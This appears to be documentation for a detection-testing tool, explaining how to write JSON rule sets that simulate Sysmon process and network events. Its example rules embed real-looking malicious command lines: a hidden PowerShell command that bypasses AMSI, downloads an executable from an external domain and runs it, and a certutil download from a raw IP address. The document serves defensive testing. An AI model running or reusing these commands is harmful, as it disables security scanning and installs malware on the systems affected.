# Writing sets
Writing a custom `rule set` is very easy. These are based on `json` format and you only need to put your rules into the `rules` child.

Also you can add extra info like:

| field | content |
| --- | --- |
| `name` | If you wan't to give your set a name. |
| `version` | Don't forget to update the versions. |
| `author` | Some credits for the authors. |
| `description` | Describe the set or add some references. |

###### header example
```
{
  "name": "rule set name",
  "version": "version number",
  "author": "author",
  "description": "simple description",
  "rules": {
  }
}
```
Now we can start writing some rules...
```
"powershell_malware": {
  "enabled": true,
  "source": "Sysmon",
  "category": "Process Create",
  "description": "I just saw this on https://www.hybrid-analysis.com/sample/fa38a52f6500cd6f16adc1d2a30193240a95761089e2636c02514522b233737d?environmentId=100",
  "payload": {
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -WindowStyle Hidden -noprofile [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);If (test-path $env:APPDATA + '\\th41.exe') {Remove-Item $env:APPDATA + '\\th41.exe'}; $OEKQD = New-Object System.Net.WebClient; $OEKQD.Headers['User-Agent'] = 'USR-KL'; $OEKQD.DownloadFile('http://kikkerdoc.com/home/kikkerdo/oo.exe', $env:APPDATA + '\\th41.exe'); (New-Object -com Shell.Application).ShellExecute($env:APPDATA + '\\th41.exe'); Stop-Process -Id $Pid -Force"
  }
},
"certutil_download_command": {
  "enabled": true,
  "source": "Sysmon",
  "category": "Process Create",
  "description": "Seems like malware is using this.",
  "payload": {
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -urlcache -split -f http://185.189.58.222/bam.exe"
  }
},
"certutil_download_command": {
  "enabled": true,
  "source": "Sysmon",
  "category": "Network connection detected",
  "description": "Also we can test it via network activity.",
  "payload": {
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "DestinationIp": "185.189.58.222"
  }
}
```
Then you need to put it into `rules` and save the file. You can test the `rule set` with:
```commandline
> malwless.exe -r rule_set_file.json
```
